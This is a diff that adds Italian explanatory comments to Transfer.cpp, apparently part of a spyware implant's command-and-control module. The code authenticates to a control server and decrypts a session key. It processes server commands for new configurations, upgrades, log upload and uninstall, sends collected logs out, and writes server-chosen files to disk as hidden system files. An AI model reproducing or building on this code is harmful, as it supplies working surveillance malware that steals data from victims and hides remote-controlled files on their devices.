@@ -949,6 +949,7 @@ INT Transfer::InternetSend(const wstring &strHostname) {
 	return SEND_FAIL;
 }
 
+//mi serve per processare gli available del server es. PROTO_NEW_CONF, PROTO_UPGRADE, PROTO_LOG, PROTO_UNINSTALL ecc...
 BYTE* Transfer::RestSendCommand(BYTE* pCommand, UINT uCommandLen, UINT &uResponseLen) {
 	
 	Encryption encK(K, 128);
@@ -1078,6 +1079,7 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 	}
 
 	// Impostiamo il cookie se ne abbiamo uno
+	// se non ci arriva il cookie significa che qualcosa è andato male
 	if (bSetCookie && strSessionCookie.empty()) {
 		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [bSetCookie && strSessionCookie.empty()]\n", 4, FALSE);
 		_InternetCloseHandle(hOpenHandle);
@@ -1095,6 +1097,8 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 		//if (HttpAddRequestHeaders(hResourceHandle, strCookie.c_str(), -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD ) == FALSE) {
 		//	HttpAddRequestHeaders(hResourceHandle, strCookie.c_str(), -1, 0);
 		//}
+
+		//ficco nell'header Http (che sto creando) il cookie
 		if (_HttpSendRequestW(hResourceHandle, strCookie.c_str(), strCookie.length(), pContent, uContentLen) == FALSE) {
 			DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpSendRequest() [cookie not set]] ", 4, TRUE);
 			_InternetCloseHandle(hOpenHandle);
@@ -1103,6 +1107,7 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 			return FALSE;
 		}
 	} else {
+		// questo serve per gestire l'assenza del cookie durante la fase di autenticazione
 		// Send POST request
 		if (_HttpSendRequestW(hResourceHandle, NULL, 0, pContent, uContentLen) == FALSE) {
 			DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpSendRequest()] ", 4, TRUE);
@@ -1120,7 +1125,8 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 	UINT uCounter = sizeof(buf);
 
 	ZeroMemory(buf, sizeof(buf));
-	
+
+	// lo uso per recuperare la lunghezza del buffer che mi sta arrivando
 	if (_HttpQueryInfoW(hResourceHandle, HTTP_QUERY_CONTENT_LENGTH, &buf, (DWORD *)&uCounter, &dwRead) == FALSE) {
 		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpQueryInfo() content length]: ", 4, TRUE);
 		_InternetCloseHandle(hOpenHandle);
@@ -1147,8 +1153,10 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 
 	// Get the cookie
 	if (strSessionCookie.empty()) {
+		// se sono entrato qui è perche sono in fase di autenticazione
 		BYTE *cookie = NULL;
 
+		//ci serve per settarci sulla seconda chiamata la giusta dimensione del buffer
 		if (_HttpQueryInfoW(hResourceHandle, HTTP_QUERY_SET_COOKIE, cookie, (DWORD *)&uCounter, &dwRead) == FALSE) {
 			DWORD lastErr = GetLastError();
 
@@ -1275,8 +1283,9 @@ UINT Transfer::RestAuth() {
 	return NULL;
 }
 
+//decifra il comandi che ci arrivano dal server
 UINT Transfer::RestGetCommand(BYTE* pContent) {
-	
+	//checco che la chive sia corrtta
 	if (RestDecryptK(pContent) == FALSE) {
 		DBG_TRACE(L"Debug - Transfer.cpp - RestDecryptK() FAILED [RestDecryptK()]\n", 4, TRUE);
 		return INVALID_COMMAND;
@@ -1309,6 +1318,7 @@ UINT Transfer::RestGetCommand(BYTE* pContent) {
 	return uCommand;
 }
 
+//Decripto K che è la chiave di sessione
 BOOL Transfer::RestDecryptK(BYTE *pContent) {
 	BYTE *ks = new(std::nothrow) BYTE[Encryption::GetPKCS5Len(16)];
 
@@ -1432,6 +1442,7 @@ BYTE* Transfer::RestCreateAuthRequest(UINT *uEncContentLen) {
 	
 }
 
+//viene usato in fase di autenticazione
 BOOL Transfer::RestIdentification() {
 	
 	// Costruiamo il pacchetto di identificazione
@@ -1563,6 +1574,7 @@ void Transfer::RestProcessAvailables() {
 
 	for (it = vAvailables.begin(); it != vAvailables.end(); it++) {
 		switch (*it) {
+			//ad oggi su wp8 viene gestita solo PROTO_NEW_CONF
 			case PROTO_NEW_CONF:
 				bNewConf = RestGetNewConf();
 				break;
@@ -1591,6 +1603,7 @@ void Transfer::RestProcessAvailables() {
 	return;
 }
 
+//da modificare per essere supportato in wp8
 BOOL Transfer::RestGetUpgrade() {
 	
 	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_UPGRADE) + 20));
@@ -1764,7 +1777,7 @@ BOOL Transfer::RestGetUpgrade() {
 	
 	return TRUE;
 }
-
+//chiediamo al server se c'e' una nuova conf, in caso affermativo la scriviamo a disco, e verra eseguita finita la sync
 BOOL Transfer::RestGetNewConf() {
 	
 	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_NEW_CONF) + 20));
@@ -1879,6 +1892,7 @@ BOOL Transfer::RestGetNewConf() {
 	return TRUE;
 }
 
+//informo il server che ho scaricata, verificata e scritta sul disco  la conf
 BOOL Transfer::RestSendConfAck(BOOL bConfOK) {
 	
 	Hash hash;
@@ -2042,6 +2056,8 @@ BOOL Transfer::RestSendLogs() {
 
 	// pSnap puo' essere nullo in caso di errore o se non c'e' uberlogObj.
 	// Lo snapshot viene liberato subito dopo questa chiamata.
+
+	//creo uno snapshot di tutti i log chiusi (cioe' quelli che non sto piu' scrivendo)
 	pSnap = uberlogObj->ListClosed();
 
 	if (pSnap == NULL || pSnap->size() == 0) {
@@ -2428,7 +2444,8 @@ BOOL Transfer::RestGetUploads() {
 
 			if (strUploaded.empty())
 				continue;
-
+			//su wp8 devo considerare "il metodo da qua" il resto è per retrocompatibilita'
+			//in concreto scarico un file che mi passa il server per sua scelta
 			hFile = _CreateFileW(strUploaded.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, NULL);
 
 			if (hFile == INVALID_HANDLE_VALUE)
